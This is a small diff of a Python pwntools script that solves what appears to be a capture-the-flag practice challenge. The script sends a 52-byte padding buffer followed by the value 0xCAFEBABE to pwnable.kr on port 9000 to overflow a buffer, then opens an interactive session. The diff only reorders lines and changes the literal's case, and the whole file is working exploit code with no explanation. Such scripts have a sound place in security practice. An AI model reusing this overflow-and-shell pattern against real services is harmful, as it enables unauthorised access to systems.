@@ -1,8 +1,6 @@
 from pwn import *
 
-p = remote("pwnable.kr", 9000)
-
-payload = b"A" * 52 + p32(0xcafebabe)
-
+payload = b"A" * 52 + p32(0xCAFEBABE)
+p = remote('pwnable.kr', 9000)
 p.sendline(payload)
 p.interactive()
